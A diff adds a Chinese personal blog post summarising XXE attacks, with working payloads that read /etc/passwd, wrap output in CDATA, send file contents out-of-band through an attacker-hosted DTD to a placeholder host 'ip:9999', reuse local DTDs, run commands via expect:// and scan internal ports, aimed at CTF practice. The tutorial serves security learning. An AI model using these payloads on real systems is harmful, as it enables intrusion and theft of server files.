@@ -1,0 +1,465 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="xxe漏洞总结" />
+
+
+<meta name="description" content="xxe理解起来还是挺难的，涉及知识比较多，今天总结一下。
+原理xxe, 外部实体注入，通过构造xml格式的恶意代码传输后被解析执行，得到攻击者想要看到的东西。仅针对外部实体而言。
+XML文档结构..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    xxe漏洞总结 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="xxe漏洞总结">
+            
+            xxe漏洞总结
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="tag">xxe漏洞总结</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/07/14</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>xxe理解起来还是挺难的，涉及知识比较多，今天总结一下。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>xxe, 外部实体注入，通过构造xml格式的恶意代码传输后被解析执行，得到攻击者想要看到的东西。仅针对外部实体而言。</p>
+<h2 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h2><p>XML文档结构包括xml声明、DTD文档类型定义、文档元素。</p>
+<h3 id="xml声明"><a href="#xml声明" class="headerlink" title="xml声明"></a>xml声明</h3><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf8&quot;?&gt;</code></p>
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD包括内部的DOCTYPE声明和外部的DOCTYPE声明。涉及外部的都得使用SYSTEM。</p>
+<ul>
+<li><p>内部</p>
+<p><code>&lt;!DOCTYPE 根元素 [元素或者实体内容]&gt;</code></p>
+</li>
+<li><p>外部</p>
+<p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p>
+<p>然后那个调用的外部文件的内容就是元素或者实体内容。</p>
+</li>
+</ul>
+<h3 id="DTD元素"><a href="#DTD元素" class="headerlink" title="DTD元素"></a>DTD元素</h3><p><code>&lt;!ELEMENT 元素名称 &quot;值&quot;&gt;</code></p>
+<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p>DTD实体又分为内部实体、外部实体和参数实体。</p>
+<ul>
+<li><p>内部实体声明</p>
+<p><code>&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt;</code></p>
+</li>
+<li><p>外部实体声明</p>
+<p><code>&lt;!ENTITY 实体名称 SYSTEM &quot;外部的URL&quot;&gt;</code></p>
+</li>
+<li><p>参数实体声明</p>
+<ol>
+<li>内部的参数实体：<code>&lt;!ENTITY %实体名称 &quot;实体值&quot;&gt;</code></li>
+<li>外部的参数实体：<code>&lt;!ENTITY %实体名称 SYSTEM &quot;外部的URL&quot;&gt;</code></li>
+</ol>
+<p>注意，参数实体只能在DTD中引用，而且是使用%实体名称引用。</p>
+</li>
+</ul>
+<h3 id="文档元素（引用实体）"><a href="#文档元素（引用实体）" class="headerlink" title="文档元素（引用实体）"></a>文档元素（引用实体）</h3><p>前面是声明，这里是引用。这里的文档元素其实只是引用内部或外部实体而已，参数实体在DTD中引用。</p>
+<ul>
+<li><p>引用内外部实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line">	&lt;name&gt;&amp;实体名称;&lt;&#x2F;name&gt;</span><br><span class="line">	&lt;password&gt;&lt;&#x2F;password&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用&amp;实体名称;来引用。</p>
+</li>
+<li><p>引用参数实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt;</span><br><span class="line">%file;	 	&#x2F;&#x2F;引用外部实体</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用%实体名称;来引用。参数实体适用于无回显xxe。</p>
+</li>
+</ul>
+<h2 id="判断是否存在xxe"><a href="#判断是否存在xxe" class="headerlink" title="判断是否存在xxe"></a>判断是否存在xxe</h2><ul>
+<li><p>正常传输情况下</p>
+<p>查看Content-Type和Accept-Type, 是否是test/xml或者其它与xml相关的。然后构造出xml格式的代码，看返回包的内容。如果发现返回包没有内容，考虑判断无回显xxe。判断的方法可以仅用burp的collaborator。复制好URL后，放到xml代码中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">	&lt;!ENTITY url SYSTEM &quot;http:&#x2F;&#x2F;86cywdrfq1gmblde1pm4dkfmcdi46t.burpcollaborator.net&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;login&gt;&amp;url;&lt;&#x2F;login&gt;</span><br><span class="line">&#x2F;&#x2F;注意，这个&lt;login&gt;不是随便构造的。是根据传输的数据来添加的。（好像也是可以随便构造的，不太确定..）比如传输的POST型数据：name&#x3D;ggy&amp;password&#x3D;123456.那么就构造出：</span><br><span class="line">&lt;root&gt;</span><br><span class="line">	&lt;name&gt;ggy&lt;&#x2F;name&gt;</span><br><span class="line">	&lt;&#x2F;password&gt;&amp;url;&lt;&#x2F;password&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br><span class="line">这个root我不知道是不是随便构造的。&amp;url的位置取决于回显的是哪个数据，不一定就是在password中。</span><br><span class="line">JSON格式的类型。</span><br></pre></td></tr></table></figure>
+
+<p>查看是否接收到了请求。</p>
+</li>
+<li><p>传输数据为JSON格式</p>
+<p>将Content-Type: application/json 修改为：application/xml, 然后注入payload。</p>
+<p><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">CTF题目地址</a> </p>
+</li>
+</ul>
+<h2 id="有回显xxe"><a href="#有回显xxe" class="headerlink" title="有回显xxe"></a>有回显xxe</h2><p>读取文件内容时能够输出在页面。但是注意文件内容如果包含&lt;&gt;&amp;等字符时，会被当成xml解析从而出错。因此应该使用CDATA不让读取的文件内容被解析。</p>
+<ul>
+<li><p>文件内容无&lt;&gt;&amp;等字符</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;外部实体poc</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE login [</span><br><span class="line">	&lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;login&gt;&amp;name;&lt;&#x2F;login&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;参数实体poc</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE login [</span><br><span class="line">	&lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">	%name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>文件内容包含&lt;&gt;&amp;等字符</p>
+<p>构造语句使读取的文件内容在CDATA里面。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%dtd</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;all;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>test.dtd的内容</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%file;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="无回显xxe"><a href="#无回显xxe" class="headerlink" title="无回显xxe"></a>无回显xxe</h2><p>也是使用参数实体。<a href="https://bnv.web.ctfcompetition.com/" target="_blank" rel="noopener">CTF题目</a> </p>
+<h3 id="引入外部dtd文件"><a href="#引入外部dtd文件" class="headerlink" title="引入外部dtd文件"></a>引入外部dtd文件</h3><p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>test.dtd的内容</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&amp;#37;</code>就是%, 需要编码才行。 使用nc监听9999端口接收信息。</p>
+<p>首先引用remote，调用外部的test.dtd文件，然后用引int，接着引用%file读取到文件后将URL赋给send, 然后引用send从而发送一个请求。就能监听到这个请求从而获取发送过来的经base64加密后的信息。</p>
+<h3 id="无需引入外部dtd文件"><a href="#无需引入外部dtd文件" class="headerlink" title="无需引入外部dtd文件"></a>无需引入外部dtd文件</h3><p>使用三层嵌套。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">	&lt;!ELEMENT message ANY&gt;</span><br><span class="line">	&lt;!ENTITY % paral SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % para &#39;</span><br><span class="line">		&lt;!ENTITY &amp;#X25; para2 &quot;&lt;!ENTITY &amp;#x26;&amp;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;paral;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">		&amp;#x25;para2;</span><br><span class="line">	&#39;&gt;</span><br><span class="line">	%para;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="file:///C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTencent%5CUsers%5C2992408375%5CQQ%5CWinTemp%5CRichOle%60REIJ%5B88%60LI$P3L7CET3$GV.png" alt="img"></p>
+<h3 id="利用本地xxe"><a href="#利用本地xxe" class="headerlink" title="利用本地xxe"></a>利用本地xxe</h3><p>使用本地的DTD文件。如何查找，看<a href="jishuwen.com/d/2EGU">这篇文章</a>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">	&lt;!ENTITY % local_dtd SYSTEM</span><br><span class="line">&quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % IS0amso &#39;</span><br><span class="line">        &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM </span><br><span class="line">&#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">        %eval;</span><br><span class="line">        %error;</span><br><span class="line">     &#39;&gt;</span><br><span class="line">	%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200714220303892.png" alt="image-20200714220303892"></p>
+<h2 id="xxe执行系统命令"><a href="#xxe执行系统命令" class="headerlink" title="xxe执行系统命令"></a>xxe执行系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY f SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;f;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="xxe探测内网端口"><a href="#xxe探测内网端口" class="headerlink" title="xxe探测内网端口"></a>xxe探测内网端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">	&lt;!ENTITY port SYSTEM &quot;http:&#x2F;&#x2F;192.168.3.102:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;login&gt;&amp;port;&lt;&#x2F;login&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用burp遍历端口即可。</p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://www.jianshu.com/p/ec2888780308" target="_blank" rel="noopener">https://www.jianshu.com/p/ec2888780308</a></p>
+<p><a href="https://xz.aliyun.com/t/3357#toc-17" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-17</a></p>
+<p><a href="https://xz.aliyun.com/t/6502#toc-20" target="_blank" rel="noopener">https://xz.aliyun.com/t/6502#toc-20</a></p>
+<p><a href="https://www.jishuwen.com/d/2EGU" target="_blank" rel="noopener">https://www.jishuwen.com/d/2EGU</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/07/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="pre-post btn btn-default" title='文件包含漏洞总结'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            文件包含漏洞总结</span>
+    </a>
+    
+    
+    <a href="/2020/07/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="next-post btn btn-default" title='文件上传漏洞总结'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            文件上传漏洞总结</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML文档结构"><span class="toc-text">XML文档结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xml声明"><span class="toc-text">xml声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD"><span class="toc-text">DTD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD元素"><span class="toc-text">DTD元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD实体"><span class="toc-text">DTD实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文档元素（引用实体）"><span class="toc-text">文档元素（引用实体）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断是否存在xxe"><span class="toc-text">判断是否存在xxe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有回显xxe"><span class="toc-text">有回显xxe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无回显xxe"><span class="toc-text">无回显xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#引入外部dtd文件"><span class="toc-text">引入外部dtd文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无需引入外部dtd文件"><span class="toc-text">无需引入外部dtd文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用本地xxe"><span class="toc-text">利用本地xxe</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe执行系统命令"><span class="toc-text">xxe执行系统命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxe探测内网端口"><span class="toc-text">xxe探测内网端口</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
